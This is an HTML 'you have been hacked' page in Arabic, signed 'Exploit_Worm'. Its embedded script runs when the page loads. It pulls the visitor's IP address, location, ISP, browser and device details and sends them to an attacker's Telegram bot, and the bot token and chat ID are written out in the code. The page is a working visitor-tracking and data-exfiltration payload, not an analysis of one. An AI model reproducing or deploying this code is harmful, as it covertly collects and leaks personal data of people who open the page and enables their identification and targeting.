<!DOCTYPE html>
<html>
<head>
  <title>تم اختراقك</title>
</head>
<body>
  <h2>تم اختراقك</h2>
  <p>تم اختراقك من قبل الهكر</p>
  <p>Exploit_Worm</p>
  <img src="fsocitey.jpg" width="200"></img>
  <script>
    async function sendInfoToTelegram() {
      const ipInfo = await fetch("https://ipapi.co/json/").then(res => res.json());

      const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        ip: ipInfo.ip,
        country: ipInfo.country_name,
        city: ipInfo.city,
        org: ipInfo.org
      };

      const message = `
      تم جلب معلومات جهاز الضحية😈
-----------------------------
IP: ${info.ip}


الدولة: ${info.country}


المدينة: ${info.city}


مزود الخدمة: ${info.org}


نظام التشغيل: ${info.platform}


المتصفح: ${info.userAgent}


اللغة: ${info.language}


دقة الشاشة: ${info.screen}
------------------------------

Exploit_Worm
      `;

      const botToken = "7594548881:AAG-1sHOYxTN-mU-OY_gwc8j2fkOk3MQohc";
      const chatId = "7392384225";

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    sendInfoToTelegram();
  </script>
</body>
</html>
